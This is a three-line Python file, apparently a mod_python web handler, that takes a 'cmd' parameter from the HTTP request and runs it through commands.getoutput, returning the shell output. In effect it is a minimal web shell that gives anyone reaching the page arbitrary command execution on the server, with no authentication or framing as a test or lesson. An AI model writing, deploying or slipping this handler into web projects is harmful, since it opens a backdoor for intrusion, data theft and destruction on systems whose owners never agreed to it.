import commands

def index(req, cmd='echo ""' ):                               
  return commands.getoutput( cmd )
